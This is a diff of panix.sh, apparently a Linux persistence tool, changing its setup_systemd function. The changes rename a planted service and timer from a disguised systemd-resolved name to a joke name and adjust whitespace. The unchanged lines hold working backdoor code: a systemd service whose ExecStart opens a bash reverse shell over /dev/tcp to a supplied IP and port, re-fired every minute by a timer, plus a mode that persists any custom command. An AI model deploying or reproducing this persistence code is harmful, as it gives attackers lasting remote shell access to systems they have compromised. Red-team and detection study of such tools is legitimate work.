@@ -82,7 +82,7 @@ setup_systemd() {
 	local default=0
 	local ip=""
 	local port=""
-
+ 
 	usage_systemd() {
 		echo "Usage: ./panix.sh --systemd [OPTIONS]"
 		echo "--examples                   Display command examples"
@@ -94,7 +94,7 @@ setup_systemd() {
 		echo "  --command <command>          Specify custom persistence command (no validation)"
 		echo "  --timer                      Create systemd timer (1 minute interval)"
 	}
-
+ 
 	while [[ "$1" != "" ]]; do
 		case $1 in
 			--default )
@@ -146,7 +146,7 @@ setup_systemd() {
 		esac
 		shift
 	done
-
+ 
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
 		echo "Try './panix.sh --systemd --help' for more information."
@@ -157,76 +157,76 @@ setup_systemd() {
 			echo "Try './panix.sh --systemd --help' for more information."
 			exit 1
 		fi
-
+ 
 		if check_root; then
-			service_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service"
-			timer_path="/usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer"
+			service_path="/usr/local/lib/systemd/system/Super-Important-Network-Name-Resolution-Please-No-Delete.service"
+			timer_path="/usr/local/lib/systemd/system/Super-Important-Network-Name-Resolution-Please-No-Delete.timer"
 		else
 			local current_user=$(whoami)
-			service_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service"
-			timer_path="/home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer"
+			service_path="/home/$current_user/.config/systemd/user/Super-Important-Network-Name-Resolution-Please-No-Delete.service"
+			timer_path="/home/$current_user/.config/systemd/user/Super-Important-Network-Name-Resolution-Please-No-Delete.timer"
 		fi
-
+ 
 		mkdir -p $(dirname "$service_path")
 		cat <<-EOF > $service_path
 		[Unit]
-		Description=Network Name Resolution
-
+		Description=Super Important Network Name Resolution Please No Delete
+ 
 		[Service]
 		ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'
 		Restart=always
 		RestartSec=60
-
+ 
 		[Install]
 		WantedBy=default.target
 		EOF
-
+ 
 		if check_root; then
-		if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service ]; then
+		if [ -f /usr/local/lib/systemd/system/Super-Important-Network-Name-Resolution-Please-No-Delete.service ]; then
 			echo "Service file created successfully!"
 		else
 			echo "Failed to create service file!"
 			exit 1
 		fi
-
+ 
 		else
-			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service ]; then
+			if [ -f /home/$current_user/.config/systemd/user/Super-Important-Network-Name-Resolution-Please-No-Delete.service ]; then
 				echo "Service file created successfully!"
 			else
 				echo "Failed to create service file!"
 				exit 1
 			fi
 		fi
-
+ 
 		cat <<-EOF > $timer_path
 		[Unit]
 		Description=Network Name Resolution Timer
-
+ 
 		[Timer]
 		OnCalendar=*:*:00
 		Persistent=true
-
+ 
 		[Install]
 		WantedBy=timers.target
 		EOF
-
+ 
 				if check_root; then
-			if [ -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer ]; then
+			if [ -f /usr/local/lib/systemd/system/Super-Important-Network-Name-Resolution-Please-No-Delete.timer ]; then
 				echo "Timer file created successfully!"
 			else
 				echo "Failed to create timer file!"
 				exit 1
 			fi
-
+ 
 		else
-			if [ -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer ]; then
+			if [ -f /home/$current_user/.config/systemd/user/Super-Important-Network-Name-Resolution-Please-No-Delete.timer ]; then
 				echo "Timer file created successfully!"
 			else
 				echo "Failed to create timer file!"
 				exit 1
 			fi
 		fi
-
+ 
 		if check_root; then
 			systemctl daemon-reload
 			systemctl enable $(basename $timer_path)
@@ -236,35 +236,35 @@ setup_systemd() {
 			systemctl --user enable $(basename $timer_path)
 			systemctl --user start $(basename $timer_path)
 		fi
-
+ 
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $service_path || -z $command ]]; then
 			echo "Error: --path and --command must be specified when using --custom."
 			echo "Try './panix.sh --systemd --help' for more information."
 			exit 1
 		fi
-
+ 
 		mkdir -p $(dirname "$service_path")
 		cat <<-EOF > $service_path
 		[Unit]
 		Description=Custom Service
-
+ 
 		[Service]
 		ExecStart=$command
 		Restart=always
 		RestartSec=60
-
+ 
 		[Install]
 		WantedBy=default.target
 		EOF
-
+ 
 		if [ -f $service_path ]; then
 			echo "Service file created successfully!"
 		else
 			echo "Failed to create service file!"
 			exit 1
 		fi
-
+ 
 		if check_root; then
 			systemctl daemon-reload
 			systemctl enable $(basename $service_path)
@@ -274,29 +274,29 @@ setup_systemd() {
 			systemctl --user enable $(basename $service_path)
 			systemctl --user start $(basename $service_path)
 		fi
-
+ 
 		if [[ $timer -eq 1 ]]; then
 			timer_path="${service_path%.service}.timer"
 			mkdir -p $(dirname "$timer_path")
 			cat <<-EOF > $timer_path
 			[Unit]
 			Description=Custom Timer
-
+ 
 			[Timer]
 			OnCalendar=*:*:00
 			Persistent=true
-
+ 
 			[Install]
 			WantedBy=timers.target
 			EOF
-
+ 
 			if [ -f $timer_path ]; then
 				echo "Timer file created successfully!"
 			else
 				echo "Failed to create timer file!"
 				exit 1
 			fi
-
+ 
 			if check_root; then
 				systemctl daemon-reload
 				systemctl enable $(basename $timer_path)
@@ -312,9 +312,10 @@ setup_systemd() {
 		echo "Try './panix.sh --systemd --help' for more information."
 		exit 1
 	fi
-
+ 
 	echo "[+] Systemd service persistence established!"
 }
+
 
 setup_generator_persistence() {
 	local ip=""
